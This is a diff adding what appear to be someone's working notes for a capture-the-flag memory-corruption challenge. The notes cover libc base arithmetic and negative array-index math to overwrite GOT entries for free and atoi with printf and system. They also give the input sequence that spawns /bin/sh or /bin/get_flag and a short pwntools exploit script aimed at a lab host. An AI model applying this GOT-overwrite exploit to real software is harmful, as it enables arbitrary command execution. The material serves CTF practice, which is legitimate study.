@@ -1,0 +1,93 @@
+
+printf_addr - printf_offset = libc_base_addr
+0x7ffff7e41cf0 - 0x53cf0 = 0x7FFFF7DEE000
+
+
+main_return_address partial overwrite:
+
+(stack_ret_addr_main - array_heap_addr) / sizeof(uint32_t) = 0x...
+(0x7fffffffed18 - 0x4042d0) / 4 = 0x7FFFFFBFAA48 / 4 = 0x1FFFFFEFEA92 = 35184371034770
+=> 35184371034770\n
+#=> 140737484139080\x00 WRONG!
+
+
+libc_base_addr + pop_rax_ret_offset = pop_rax_ret_addr
+0x7FFFF7DEE000 + 0x3be88 = 0x7FFFF7E29E88
+=> partial overwrite: 0xF7E29E88  => \x88\x9E\xE2\xF7\x00    => 4158824072
+
+#this returns to main
+#now free is loaded in got
+now we can start overwriting got
+
+#maybe update heap addr?
+
+
+got free partial overwrite:
+
+(free_got_entry - array_heap_addr) mod 2^64 = 0x...
+(0x403470 - 0x4042d0) mod 2^64 = 0xFFFFFFFFFFFFF1A0 = 18446744073709547936
+=> 18446744073709547936 || /bin/get_flag\x00
+
+0x3FFFFFFFFFFFFC68 = 4611686018427386984
+=> 4611686018427386984 || /bin/sh\x00          DIS WORKS SOMEWHAT...   MIT /4 !!!
+
+mit 0x404660:
+(0x403470 - 0x404660) / 4 mod 2^64 = 0xFFFFFFFFFFFFEE10 / 4 = 0x3FFFFFFFFFFFFB84 = 4611686018427386756    //TODO: ADD +1 to formula... (ommited in notation)
+=> 4611686018427386756 || /bin/sh        OOPS :( need dif for atoi. not free.
+
+
+
+FIRST PARTIAL OVERWRITE:
+main: 0x4011a2 (second) or 0x401116 = 4198678 (first)  lets do it with printf: 0x401108 = 4198664      => in free
+
+system => in atoi
+
+
+
+libcbase_addr + system_offset = system_addr
+0x7FFFF7DEE000 + 0x45e50 = 0x7FFFF7E33E50 
+=> partial owerwrite: 0xF7E33E50 = 4158864976
+
+
+
+fourth:
+(atoi_got_entry - array_heap_addr) mod 2^64 = 0x...
+(0x4034c0 - 0x4042d0) + 1  / 4 mod 2^64 = 0xFFFFFFFFFFFFF1F0 / 4 = 0x3FFFFFFFFFFFFC7C
+
+mit 0x404660:
+= FFFFFFFFFFFFEE60 / 4 = 3FFFFFFFFFFFFB98 = 4611686018427386776
+
+
+
+WORKING:
+first input: 4611686018427386984
+second input: 4198664
+third input:  4611686018427386776         # || /bin/sh     => new calloc:  0x404660 statt 0x4042d0 für array!
+fourth input: 4158864976
+fifth input: /bin/get_flag && /bin/bash
+
+
+Possible Python Exploit:
+
+#!/usr/bin/python3
+
+from pwn import *
+
+#assign host and port to connect to
+if len(sys.argv) >= 3:
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+else:
+    host = "hacky1"
+    port = 13706
+
+proc=remote(host, port)
+proc.write(b"4611686018427386984\n4198664\n4611686018427386776\n4158864976\n")
+proc.read()
+proc.write(b"/bin/get_flag\n")
+print(proc.readline().decode())
+
+
+
+
+
